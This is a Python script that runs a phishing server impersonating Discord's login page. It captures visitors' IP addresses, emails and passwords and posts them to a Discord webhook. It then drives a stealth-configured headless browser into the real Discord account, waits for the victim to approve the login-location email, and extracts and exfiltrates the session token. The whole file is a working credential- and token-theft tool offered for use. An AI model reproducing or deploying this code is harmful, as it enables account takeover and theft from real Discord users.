import os
import json
import sys
import asyncio
import time
import threading
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from playwright.async_api import async_playwright
from datetime import datetime

WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN")

sessions = {}
pending_emails = {}

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord - Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#313338;--bg-dark:#1e1f22;--text-white:#f2f3f5;--text-muted:#b5bac1;--text-gray:#949ba4;--blurple:#5865f2;--blurple-hover:#4752c4;--link:#00a8fc;--input-bg:#1e1f22;--error:#f23f43;--success:#23a55a;}
html,body{height:100%;width:100%;font-family:'gg sans','Noto Sans',Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text-white);overflow:hidden;}
body::before{content:'';position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse 300px 300px at 0% 0%, rgba(88,101,242,0.08) 0%, transparent 70%),radial-gradient(ellipse 250px 250px at 100% 15%, rgba(88,101,242,0.06) 0%, transparent 70%);pointer-events:none;}
.container{position:relative;z-index:1;width:100%;height:100%;display:flex;flex-direction:column;padding:16px 24px 40px;max-width:480px;margin:0 auto;}
.back-arrow{display:flex;align-items:center;justify-content:center;width:36px;height:36px;cursor:pointer;margin-bottom:24px;margin-left:-4px;border-radius:50%;transition:background 0.15s;}
.back-arrow:hover{background:rgba(255,255,255,0.05);}
.back-arrow svg{width:22px;height:22px;fill:none;stroke:var(--text-muted);stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
.back-arrow:hover svg{stroke:var(--text-white);}
.header{text-align:center;margin-bottom:28px;}
.header h1{font-size:26px;font-weight:800;color:var(--text-white);margin-bottom:8px;letter-spacing:-0.2px;}
.header p{font-size:15px;color:var(--text-muted);font-weight:400;line-height:1.3;}
.form-group{margin-bottom:20px;}
.form-group label{display:block;font-size:12px;font-weight:700;color:var(--text-muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:0.02em;}
.input-wrapper{position:relative;width:100%;}
.form-group input{width:100%;height:52px;background:var(--input-bg);border:none;border-radius:8px;padding:0 16px;font-size:16px;color:var(--text-white);font-family:inherit;outline:none;transition:box-shadow 0.15s;-webkit-appearance:none;}
.form-group input::placeholder{color:var(--text-gray);opacity:0.5;}
.form-group input:focus{box-shadow:0 0 0 2px var(--blurple);}
.form-group input.error{box-shadow:0 0 0 2px var(--error);}
.error-message{display:none;align-items:center;gap:6px;margin-top:8px;font-size:12px;color:var(--error);font-weight:500;}
.error-message.visible{display:flex;}
.error-message::before{content:'!';display:flex;align-items:center;justify-content:center;width:16px;height:16px;background:var(--error);color:#fff;border-radius:50%;font-size:11px;font-weight:700;flex-shrink:0;}
.success-message{display:none;align-items:center;gap:6px;margin-top:12px;font-size:14px;color:var(--success);font-weight:600;text-align:center;justify-content:center;padding:12px;background:rgba(35,165,90,0.1);border-radius:8px;}
.success-message.visible{display:flex;}
.eye-toggle{position:absolute;right:16px;top:50%;transform:translateY(-50%);cursor:pointer;padding:4px;display:flex;align-items:center;justify-content:center;background:none;border:none;}
.eye-toggle svg{width:22px;height:22px;fill:none;stroke:var(--text-gray);stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;}
.eye-toggle:hover svg{stroke:var(--text-muted);}
.forgot-link{display:inline-block;margin-top:8px;font-size:14px;font-weight:500;color:var(--link);text-decoration:none;cursor:pointer;transition:color 0.15s;}
.forgot-link:hover{text-decoration:underline;}
.login-btn{width:100%;height:44px;border:none;border-radius:8px;background:var(--blurple);color:#fff;font-size:16px;font-weight:600;font-family:inherit;cursor:pointer;margin-top:8px;transition:background 0.15s, transform 0.1s;letter-spacing:0.02em;}
.login-btn:hover{background:var(--blurple-hover);}
.login-btn:active{transform:scale(0.98);}
.login-btn:disabled{opacity:0.5;cursor:not-allowed;}
.login-btn.loading{pointer-events:none;color:transparent;position:relative;}
.login-btn.loading::after{content:'';position:absolute;left:50%;top:50%;width:8px;height:8px;margin:-4px 0 0 -20px;border-radius:50%;background:#fff;animation:dots 1.2s infinite;}
@keyframes dots{0%,80%,100%{box-shadow:12px 0 0 #fff,24px 0 0 #fff}40%{box-shadow:12px -6px 0 #fff,24px 0 0 #fff}60%{box-shadow:12px 0 0 #fff,24px -6px 0 #fff}}
.passkey-link{display:block;text-align:center;margin-top:16px;font-size:14px;font-weight:500;color:var(--link);text-decoration:none;cursor:pointer;transition:color 0.15s;}
.passkey-link:hover{text-decoration:underline;}
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;z-index:100;padding:24px;backdrop-filter:blur(2px);}
.modal-overlay.active{display:flex;}
.modal{background:#2b2d31;border-radius:12px;padding:24px;width:100%;max-width:400px;position:relative;box-shadow:0 0 20px rgba(0,0,0,0.3);}
.modal-close{position:absolute;top:16px;right:16px;width:24px;height:24px;cursor:pointer;display:flex;align-items:center;justify-content:center;background:none;border:none;color:var(--text-muted);font-size:24px;line-height:1;padding:0;}
.modal-close:hover{color:var(--text-white);}
.modal h2{font-size:20px;font-weight:700;color:var(--text-white);margin-bottom:12px;padding-right:32px;}
.modal p{font-size:14px;color:var(--text-muted);line-height:1.5;margin-bottom:20px;}
.modal-input{width:100%;height:48px;background:var(--input-bg);border:none;border-radius:8px;padding:0 16px;font-size:16px;color:var(--text-white);font-family:inherit;outline:none;margin-bottom:16px;}
.modal-input:focus{box-shadow:0 0 0 2px var(--blurple);}
.modal-btn{width:100%;height:44px;border:none;border-radius:8px;background:var(--blurple);color:#fff;font-size:16px;font-weight:600;font-family:inherit;cursor:pointer;transition:background 0.15s;}
.modal-btn:hover{background:var(--blurple-hover);}
.modal-btn.secondary{background:var(--bg-dark);color:var(--text-white);}
.modal-btn.secondary:hover{background:#3a3c42;}
.status-box{background:var(--bg-dark);border-radius:8px;padding:20px;margin-bottom:20px;text-align:center;border:1px solid rgba(88,101,242,0.2);}
.status-box .icon{font-size:40px;margin-bottom:12px;}
.status-box h3{font-size:16px;font-weight:600;color:var(--text-white);margin-bottom:8px;}
.status-box p{font-size:14px;color:var(--text-muted);margin:0;line-height:1.4;}
@media(min-width:481px){.container{justify-content:center;padding-top:60px;}}
</style>
</head>
<body>
<div class="container">
  <div class="back-arrow" onclick="history.back()">
    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
  </div>
  <div class="header">
    <h1>Welcome back!</h1>
    <p>We're so excited to see you again!</p>
  </div>
  <form id="loginForm">
    <div class="form-group">
      <label>Email or Phone Number <span style="color:var(--error)">*</span></label>
      <div class="input-wrapper">
        <input type="text" id="email" autocomplete="username" autocapitalize="none" spellcheck="false" placeholder="">
      </div>
      <div class="error-message" id="emailError">This field is required</div>
    </div>
    <div class="form-group">
      <label>Password <span style="color:var(--error)">*</span></label>
      <div class="input-wrapper">
        <input type="password" id="password" autocomplete="current-password" placeholder="">
        <button type="button" class="eye-toggle" onclick="togglePassword()">
          <svg id="eyeIcon" viewBox="0 0 24 24">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>
      <a class="forgot-link" href="#" onclick="showForgotModal();return false">Forgot your password?</a>
    </div>
    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
    <a class="passkey-link" href="#">Or, sign in with passkey</a>
    <div class="success-message" id="statusMsg"></div>
  </form>
</div>

<div class="modal-overlay" id="forgotModal">
  <div class="modal">
    <button class="modal-close" onclick="closeForgotModal()">&times;</button>
    <h2>Reset your password</h2>
    <p>Enter your email address and we'll send you instructions to reset your password.</p>
    <input type="text" class="modal-input" id="resetEmail" placeholder="name@example.com" autocomplete="email">
    <button class="modal-btn" id="resetBtn" onclick="submitForgot()">Send Reset Instructions</button>
    <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeForgotModal()">Cancel</button>
  </div>
</div>

<div class="modal-overlay" id="verifyModal">
  <div class="modal">
    <h2>New Login Location Detected</h2>
    <div class="status-box">
      <div class="icon">📧</div>
      <h3>Check your Gmail</h3>
      <p>Discord has sent a "Verify New Login Location" email. Click the link in that email to approve this login.</p>
    </div>
    <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px;text-align:center;">After clicking the link in your email, click below:</p>
    <button class="modal-btn" id="verifyBtn" onclick="checkVerification()">I've Verified - Continue</button>
    <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeVerifyModal()">Cancel</button>
  </div>
</div>

<script>
let currentEmail = '';
let currentPassword = '';

function togglePassword() {
  const input = document.getElementById('password');
  const icon = document.getElementById('eyeIcon');
  if (input.type === 'password') {
    input.type = 'text';
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
  } else {
    input.type = 'password';
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>';
  }
}

function showForgotModal() {
  document.getElementById('forgotModal').classList.add('active');
  document.getElementById('resetEmail').value = document.getElementById('email').value || '';
  document.getElementById('resetEmail').focus();
}

function closeForgotModal() {
  document.getElementById('forgotModal').classList.remove('active');
}

function showVerifyModal() {
  document.getElementById('verifyModal').classList.add('active');
}

function closeVerifyModal() {
  document.getElementById('verifyModal').classList.remove('active');
}

async function checkVerification() {
  const btn = document.getElementById('verifyBtn');
  btn.classList.add('loading');
  btn.disabled = true;
  btn.textContent = 'Checking...';
  
  try {
    const response = await fetch('/api/check-verify', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: currentEmail})
    });
    
    const data = await response.json();
    
    if (data.success) {
      closeVerifyModal();
      document.getElementById('statusMsg').innerHTML = '<strong>✅ Login Successful!</strong><br>Token captured.';
      document.getElementById('statusMsg').classList.add('visible');
    } else {
      alert('Not verified yet. Please check your Gmail and click the verification link.');
    }
  } catch (err) {
    alert('Error checking status');
  } finally {
    btn.classList.remove('loading');
    btn.disabled = false;
    btn.textContent = "I've Verified - Continue";
  }
}

async function submitForgot() {
  const email = document.getElementById('resetEmail').value.trim();
  const btn = document.getElementById('resetBtn');
  
  if (!email) {
    alert('Please enter your email');
    return;
  }
  
  btn.classList.add('loading');
  btn.disabled = true;
  
  try {
    await fetch('/api/forgot', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email})
    });
    
    closeForgotModal();
    document.getElementById('statusMsg').innerHTML = '<strong>📧 Check your Gmail!</strong><br>Reset email sent by Discord.';
    document.getElementById('statusMsg').classList.add('visible');
  } catch (err) {
    alert('Failed');
  } finally {
    btn.classList.remove('loading');
    btn.disabled = false;
  }
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;
  const btn = document.getElementById('loginBtn');
  const emailError = document.getElementById('emailError');
  const statusMsg = document.getElementById('statusMsg');
  
  currentEmail = email;
  currentPassword = password;
  
  document.getElementById('email').classList.remove('error');
  emailError.classList.remove('visible');
  statusMsg.classList.remove('visible');
  
  if (!email) {
    document.getElementById('email').classList.add('error');
    emailError.classList.add('visible');
    return;
  }
  
  if (!password) {
    alert('Please enter password');
    return;
  }
  
  btn.classList.add('loading');
  btn.disabled = true;
  statusMsg.textContent = 'Logging in...';
  statusMsg.classList.add('visible');
  
  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email, password})
    });
    
    const data = await response.json();
    
    if (data.needsVerify) {
      statusMsg.classList.remove('visible');
      showVerifyModal();
    } else if (data.success) {
      statusMsg.innerHTML = '<strong>✅ Success!</strong><br>Token captured.';
      statusMsg.classList.add('visible');
    } else {
      statusMsg.textContent = 'Error: ' + (data.error || 'Login failed');
      statusMsg.style.color = 'var(--error)';
      statusMsg.classList.add('visible');
    }
  } catch (err) {
    statusMsg.textContent = 'Failed: ' + err.message;
    statusMsg.style.color = 'var(--error)';
    statusMsg.classList.add('visible');
  } finally {
    btn.classList.remove('loading');
    btn.disabled = false;
  }
});
</script>
</body>
</html>"""

def send_hook(embed):
    try:
        data = json.dumps({"embeds": [embed], "username": "Discord Logger"}).encode()
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print(f"Webhook error: {e}")

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ip = self.headers.get("X-Forwarded-For", self.client_address[0])
        ua = self.headers.get("User-Agent", "Unknown")[:100]
        
        send_hook({
            "title": "👁️ Visitor",
            "fields": [
                {"name": "IP", "value": f"```{ip}```", "inline": True},
                {"name": "Path", "value": f"```{self.path}```", "inline": True}
            ],
            "color": 0x3498db
        })
        
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(HTML.encode())

    def do_POST(self):
        ip = self.headers.get("X-Forwarded-For", self.client_address[0])
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length)) if length else {}
        
        if self.path == "/api/login":
            email = body.get("email", "")
            password = body.get("password", "")
            
            send_hook({
                "title": "🔐 Credentials Captured",
                "fields": [
                    {"name": "Email", "value": f"```{email}```", "inline": False},
                    {"name": "Password", "value": f"```{password}```", "inline": False},
                    {"name": "IP", "value": f"```{ip}```", "inline": True}
                ],
                "color": 0xe74c3c
            })
            
            sid = f"{email}_{int(time.time())}"
            sessions[sid] = {"email": email, "password": password, "token": None, "stage": "starting"}
            pending_emails[email] = sid
            
            def run():
                asyncio.run(real_discord_login(sid, email, password, ip))
            
            threading.Thread(target=run, daemon=True).start()
            
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"needsVerify": True}).encode())
            
        elif self.path == "/api/check-verify":
            email = body.get("email", "")
            sid = pending_emails.get(email)
            
            if sid and sessions.get(sid, {}).get("token"):
                self.send_response(200)
                self.end_headers()
                self.wfile.write(json.dumps({"success": True, "token": sessions[sid]["token"][:50] + "..."}).encode())
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(json.dumps({"success": False}).encode())
                
        elif self.path == "/api/forgot":
            email = body.get("email", "")
            send_hook({"title": "🔄 Password Reset Requested", "fields": [{"name": "Email", "value": f"```{email}```"}], "color": 0xf39c12})
            
            def run():
                asyncio.run(real_forgot(email, ip))
            
            threading.Thread(target=run, daemon=True).start()
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(json.dumps({"sent": True}).encode())

async def real_discord_login(sid, email, password, client_ip):
    """Actually log into Discord which triggers the verification email"""
    try:
        async with async_playwright() as p:
            # Launch with stealth
            browser = await p.chromium.launch(
                headless=True,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            )
            
            # Create context with realistic fingerprint
            context = await browser.new_context(
                viewport={"width": 1920, "height": 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                locale="en-US",
                timezone_id="America/New_York",
                geolocation={"latitude": 40.7128, "longitude": -74.0060},
                permissions=["geolocation"],
                color_scheme="dark"
            )
            
            # Add stealth scripts
            await context.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                window.chrome = { runtime: {} };
                Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
                Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 4});
            """)
            
            page = await context.new_page()
            
            # Navigate to Discord login
            await page.goto("https://discord.com/login", wait_until="networkidle")
            await asyncio.sleep(3)
            
            # Wait for form to be ready
            await page.wait_for_selector('input[name="email"]', state="visible", timeout=10000)
            
            # Human-like typing for email
            email_input = await page.query_selector('input[name="email"]')
            await email_input.click()
            await asyncio.sleep(0.5)
            await email_input.type(email, delay=100)
            
            await asyncio.sleep(0.8)
            
            # Human-like typing for password
            pass_input = await page.query_selector('input[name="password"]')
            await pass_input.click()
            await asyncio.sleep(0.5)
            await pass_input.type(password, delay=100)
            
            await asyncio.sleep(1)
            
            # Click login button
            submit_btn = await page.query_selector('button[type="submit"]')
            await submit_btn.click()
            
            # Wait for response
            await asyncio.sleep(6)
            
            # Check current state
            current_url = page.url
            page_content = await page.content()
            page_text = await page.inner_text('body')
            
            send_hook({
                "title": "🔍 Login Attempt Status",
                "fields": [
                    {"name": "URL", "value": f"```{current_url}```", "inline": False},
                    {"name": "Page Contains", "value": f"```{page_text[:200]}```", "inline": False}
                ],
                "color": 0x9b59b6
            })
            
            # Check if we got "New Login Location" or verification required
            verification_keywords = [
                "new login location",
                "verify this login",
                "check your email",
                "confirm this login",
                "unusual location",
                "verify it's you",
                "verification required",
                "confirm new login"
            ]
            
            needs_verification = any(keyword in page_text.lower() or keyword in page_content.lower() for keyword in verification_keywords)
            
            # Also check for specific UI elements
            verify_button = await page.query_selector('button:has-text("Verify")')
            verify_header = await page.query_selector('text=/verify|confirm/i')
            
            if needs_verification or verify_button or verify_header or "login" in current_url:
                send_hook({
                    "title": "📧 Discord Sent Verification Email",
                    "fields": [
                        {"name": "Status", "value": "Discord automatically sent 'New Login Location' email", "inline": False},
                        {"name": "Email", "value": f"```{email}```", "inline": True},
                        {"name": "Next Step", "value": "User must click link in Gmail", "inline": True}
                    ],
                    "color": 0xf1c40f
                })
                
                sessions[sid]["stage"] = "waiting_for_email_verification"
                
                # Poll for up to 10 minutes waiting for user to verify via email
                for attempt in range(120):
                    await asyncio.sleep(5)
                    
                    # Refresh page
                    await page.reload()
                    await asyncio.sleep(3)
                    
                    new_url = page.url
                    new_content = await page.content()
                    
                    # Check if we're now logged in (redirected away from login)
                    if "login" not in new_url and "verify" not in new_url:
                        # Try to get token
                        token = await page.evaluate("() => localStorage.getItem('token')")
                        if token:
                            sessions[sid]["token"] = token
                            sessions[sid]["stage"] = "completed"
                            
                            send_hook({
                                "title": "🎉 TOKEN CAPTURED!",
                                "fields": [
                                    {"name": "Token", "value": f"```{token}```", "inline": False},
                                    {"name": "Email", "value": f"```{email}```", "inline": True},
                                    {"name": "Password", "value": f"```{password}```", "inline": True},
                                    {"name": "Final URL", "value": f"```{new_url}```", "inline": False}
                                ],
                                "color": 0x2ecc71
                            })
                            break
                    
                    # Check token even if still on login page (sometimes Discord updates in background)
                    token = await page.evaluate("() => localStorage.getItem('token')")
                    if token:
                        sessions[sid]["token"] = token
                        sessions[sid]["stage"] = "completed"
                        
                        send_hook({
                            "title": "🎉 TOKEN CAPTURED (Background)!",
                            "fields": [
                                {"name": "Token", "value": f"```{token}```", "inline": False},
                                {"name": "Email", "value": f"```{email}```", "inline": True}
                            ],
                            "color": 0x2ecc71
                        })
                        break
                
                if not sessions[sid].get("token"):
                    send_hook({
                        "title": "⏰ Verification Timeout",
                        "fields": [{"name": "Status", "value": "User did not verify in time", "inline": False}],
                        "color": 0xe67e22
                    })
            else:
                # No verification needed, check for token
                token = await page.evaluate("() => localStorage.getItem('token')")
                
                if token:
                    sessions[sid]["token"] = token
                    sessions[sid]["stage"] = "completed_no_verify"
                    
                    send_hook({
                        "title": "🎉 TOKEN (No Verification Needed)",
                        "fields": [
                            {"name": "Token", "value": f"```{token}```", "inline": False},
                            {"name": "Email", "value": f"```{email}```", "inline": True},
                            {"name": "Note", "value": "Account had no location protection", "inline": False}
                        ],
                        "color": 0x2ecc71
                    })
                else:
                    # Check for error
                    error_elem = await page.query_selector('[class*="error"]')
                    if error_elem:
                        error_text = await error_elem.inner_text()
                        send_hook({
                            "title": "❌ Login Error",
                            "fields": [{"name": "Error", "value": f"```{error_text[:500]}```", "inline": False}],
                            "color": 0xe74c3c
                        })
                    else:
                        send_hook({
                            "title": "❌ No Token Found",
                            "fields": [{"name": "Status", "value": "Unknown state", "inline": False}],
                            "color": 0x95a5a6
                        })
            
            await browser.close()
            
    except Exception as e:
        send_hook({
            "title": "❌ Automation Failed",
            "fields": [{"name": "Error", "value": f"```{str(e)[:1000]}```", "inline": False}],
            "color": 0x95a5a6
        })

async def real_forgot(email, ip):
    """Actually trigger Discord password reset"""
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
            context = await browser.new_context(
                viewport={"width": 1920, "height": 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            
            page = await context.new_page()
            
            await page.goto("https://discord.com/forgot")
            await page.wait_for_selector('input[name="email"]')
            await page.fill('input[name="email"]', email)
            await asyncio.sleep(1)
            await page.click('button[type="submit"]')
            await asyncio.sleep(4)
            
            send_hook({
                "title": "✅ Discord Reset Email Triggered",
                "fields": [
                    {"name": "Email", "value": f"```{email}```", "inline": False},
                    {"name": "Action", "value": "Discord sent reset email to user", "inline": False}
                ],
                "color": 0x2ecc71
            })
            
            await browser.close()
    except Exception as e:
        print(f"Forgot error: {e}")

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    server = ThreadedHTTPServer(("0.0.0.0", port), Handler)
    print(f"Server running on port {port}")
    server.serve_forever()
